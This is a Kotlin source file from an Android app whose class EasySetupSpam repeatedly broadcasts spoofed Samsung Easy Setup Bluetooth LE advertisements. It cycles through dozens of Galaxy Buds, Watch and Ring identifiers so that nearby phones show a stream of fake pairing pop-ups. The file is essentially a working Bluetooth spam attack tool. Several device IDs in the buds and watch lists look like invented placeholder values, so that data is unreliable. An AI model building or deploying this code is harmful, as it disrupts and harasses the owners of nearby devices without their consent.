package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class EasySetupSpam(private val type: EasySetupDevice.Type) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null

    val devices: Array<EasySetupDevice>
    private val devicesAdvertiseData: Array<AdvertiseData>
    private val scanResponse: AdvertiseData

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    init {
        devices = when (type) {
            EasySetupDevice.Type.BUDS -> arrayOf(
                EasySetupDevice("0xEE7A0C", "Fallback Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x9D1700", "Fallback Dots", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x39EA48", "Light Purple Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xA7C62C", "Bluish Silver Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x850116", "Black Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3D8F41", "Gray & Black Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3B6D02", "Bluish Chrome Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xAE063C", "Gray Beige Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xB8B905", "Pure White Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xEAAA17", "Pure White Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xD30704", "Black Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x9DB006", "French Flag Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x101F1A", "Dark Purple Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x859608", "Dark Blue Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x8E4503", "Pink Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x2C6740", "White & Black Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x3F6718", "Bronze Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x42C519", "Red Buds Live", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xAE073A", "Black & White Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x011716", "Sleek Black Buds2", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x123456", "Ocean Blue Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x654321", "Forest Green Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x789ABC", "Sunset Orange Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xDEF123", "Midnight Black Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x456789", "Rose Gold Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0xABC123", "Electric Yellow Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x321654", "Crimson Red Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x987654", "Arctic White Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x654987", "Mystic Purple Buds", EasySetupDevice.Type.BUDS),
                EasySetupDevice("0x321987", "Golden Buds", EasySetupDevice.Type.BUDS)
            )
            EasySetupDevice.Type.WATCH -> arrayOf(
                EasySetupDevice("0x1A", "Fallback Watch", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x01", "White Watch4 Classic 44m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x02", "Black Watch4 Classic 40m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x03", "White Watch4 Classic 40m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x04", "Black Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x05", "Silver Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x06", "Green Watch4 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x07", "Black Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x08", "White Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x09", "Gold Watch4 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0A", "French Watch4", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0B", "French Watch4 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x0C", "Fox Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x11", "Black Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x12", "Sapphire Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x13", "Purplish Watch5 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x14", "Gold Watch5 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x15", "Black Watch5 Pro 45mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x16", "Gray Watch5 Pro 45mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x17", "White Watch5 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x18", "White & Black Watch5", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1B", "Black Watch6 Pink 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1C", "Gold Watch6 Gold 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1D", "Silver Watch6 Cyan 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x1E", "Black Watch6 Classic 43m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x20", "Green Watch6 Classic 43m", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x21", "Midnight Black Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x22", "Ocean Blue Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x23", "Rose Gold Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x24", "Electric Yellow Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x25", "Crimson Red Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x26", "Arctic White Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x27", "Mystic Purple Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x28", "Golden Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x29", "Forest Green Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x2A", "Sunset Orange Watch6", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x30", "Black Galaxy Watch7 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x31", "Green Galaxy Watch7 44mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x32", "Cream Galaxy Watch7 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x33", "Green Galaxy Watch7 40mm", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x34", "White Galaxy Watch7 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x35", "Black Galaxy Watch7 Classic", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x40", "Titanium White Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x41", "Titanium Black Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x42", "Titanium Silver Watch Ultra", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x60", "Black Galaxy Ring", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x61", "Gold Galaxy Ring", EasySetupDevice.Type.WATCH),
                EasySetupDevice("0x62", "Silver Galaxy Ring", EasySetupDevice.Type.WATCH)
            )
        }

        devicesAdvertiseData = devices.map { device ->
            AdvertiseData.Builder()
                .addManufacturerData(0x0075, Helper.convertHexToByteArray(device.toManufacturerData()))
                .build()
        }.toTypedArray()

        scanResponse = AdvertiseData.Builder()
            .addManufacturerData(0x0075, Helper.convertHexToByteArray("0000000000000000000000000000"))
            .build()
    }

    override fun start() {
        executor.execute {
            isSpamming = true
            val bluetoothAdvertiser = BluetoothAdvertiser()
            repeat(Helper.MAX_LOOP + 1) {
                if (!isSpamming) {
                    bluetoothAdvertiser.stopAdvertising()
                    return@execute
                }

                val device = devices.random()
                val data = devicesAdvertiseData[devices.indexOf(device)]

                bluetoothAdvertiser.advertise(data, if (device.deviceType == EasySetupDevice.Type.BUDS) scanResponse else null)
                com.droid.dolphy.trackBlePackets(1)

                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return@execute
                }

                bluetoothAdvertiser.stopAdvertising()
            }
            bluetoothAdvertiser.stopAdvertising()
            isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}

